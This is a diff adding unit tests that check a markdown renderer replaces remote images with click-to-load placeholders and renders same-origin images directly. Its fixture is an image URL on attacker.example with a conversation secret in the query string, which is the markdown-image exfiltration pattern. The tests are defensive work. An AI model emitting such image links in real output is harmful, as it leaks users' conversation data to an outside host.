@@ -338,3 +338,36 @@ describe('inline code block langtag', () => {
     expect(code!.className).toContain(`language-${langtag}`);
   });
 });
+
+describe('remote images', () => {
+  const remote = 'https://attacker.example/p.png?d=conversation-secret';
+
+  it('renders a remote image as a placeholder that carries no src', () => {
+    const div = parse(`![chart](${remote})`);
+
+    // No <img> at all: the browser makes no request, so the URL cannot beacon.
+    expect(div.querySelector('img')).toBeNull();
+    const placeholder = div.querySelector('button.remote-image-placeholder');
+    expect(placeholder).not.toBeNull();
+    expect(placeholder).toHaveAttribute('data-remote-src', remote);
+    expect(placeholder).toHaveTextContent('attacker.example');
+  });
+
+  it('loads the remote image only after a click', () => {
+    const div = parse(`![chart](${remote})`);
+    div.querySelector<HTMLButtonElement>('button.remote-image-placeholder')!.click();
+
+    const img = div.querySelector('img');
+    expect(img).not.toBeNull();
+    expect(img).toHaveAttribute('src', remote);
+    expect(div.querySelector('.remote-image-placeholder')).toBeNull();
+  });
+
+  it('renders same-origin images directly', () => {
+    const src = '/api/v2/conversations/abc/files/chart.png';
+    const div = parse(`![chart](${src})`);
+
+    expect(div.querySelector('button.remote-image-placeholder')).toBeNull();
+    expect(div.querySelector('img')).toHaveAttribute('src', src);
+  });
+});
